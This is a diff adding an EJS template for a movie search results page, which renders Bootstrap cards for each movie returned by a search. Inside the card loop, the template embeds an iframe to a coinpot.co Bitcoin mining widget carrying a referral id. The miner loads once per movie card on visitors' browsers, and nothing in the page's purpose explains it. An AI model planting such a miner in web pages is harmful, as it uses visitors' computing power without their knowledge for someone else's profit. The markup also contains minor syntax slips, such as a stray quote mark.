@@ -1,0 +1,45 @@
+
+  <%- include("../partials/header") %>
+
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href="https://fonts.googleapis.com/css?family=Courgette" rel="stylesheet"> 
+      <link type="text/css" href="/public/css/bootstrap.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Play" rel="stylesheet">
+      <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    
+  </head>
+  <div > 
+    <div class="jumbotron text-center" "> 
+      <h1 >Movies List</h1></div>
+  <div class="container" >
+    <div class="jumbotron text-center" id="jumbo-id"> 
+        <%if(movieData.Response==='False'){%>
+            <h1>movie not found</h1>
+            <%}else{%>
+                <div class="row">
+                <%movieData['Search'].forEach(function(movie){%>
+                   
+                          
+                    
+                    <div class="card" style="width: 18rem;">
+                        <img src="<%=movie.Poster%>" class="card-img-top" alt="...">
+                        <div class="card-body">
+                          <h5 class="card-title">"<%=movie.Title%>"</h5>
+                          
+                          <a href="/result/<%=movie.imdbID%>" class="btn btn-primary">Details</a>
+                        </div>
+                        <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoin/?ref=CD21E3752512&mode=widget" style="overflow:hidden;width:324px;height:300px;"></iframe>
+			
+                      </div>
+                      
+                     
+                      
+                    <%})%>
+                    <%}%>
+                  </div></div>
+                </div>
+                    <%- include("../partials/footer") %>
